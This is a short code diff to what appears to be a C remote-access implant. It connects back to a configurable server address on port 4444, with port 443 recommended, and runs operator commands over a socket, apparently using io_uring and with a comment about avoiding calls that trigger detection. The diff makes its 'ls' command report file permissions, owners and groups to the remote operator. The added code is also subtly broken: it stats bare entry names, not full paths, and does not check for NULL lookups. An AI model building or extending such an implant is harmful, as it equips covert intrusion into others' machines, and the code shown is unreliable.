@@ -20,6 +20,10 @@
 #include <termios.h>
 #include <signal.h>
 #include <poll.h>
+#include <sys/stat.h>
+#include <pwd.h>
+#include <grp.h>
+
 
 #define SERVER_IP "127.0.0.1" //CHANGE THIS BRO
 #define SERVER_PORT 4444 // RECOMMENDEED PORT 443
@@ -816,6 +820,7 @@ cmd_ls that will use some standard calls like cmd_ps which might trigger stuff
 void cmd_ls(struct io_uring *ring, int sockfd, const char *path) {
     char out[16384];
     size_t pos = 0;
+    struct stat info;
 
     DIR *dir = opendir(path);
     if (!dir) {
@@ -827,7 +832,13 @@ void cmd_ls(struct io_uring *ring, int sockfd, const char *path) {
 
     while ((entry = readdir(dir)) != NULL) {
         /* printf("%s\n", entry->d_name); */
-        pos += snprintf(out + pos, sizeof(out) - pos, "%s\n", entry->d_name);
+         
+            stat(entry->d_name, &info);
+            // Print permissions (octal or string), then owner and group names
+            pos += snprintf(out + pos, sizeof(out) - pos, "%o %s %s %s\n", info.st_mode & 0777, 
+                   getpwuid(info.st_uid)->pw_name, 
+                   getgrgid(info.st_gid)->gr_name, 
+                   entry->d_name);            
     }
 
     closedir(dir);
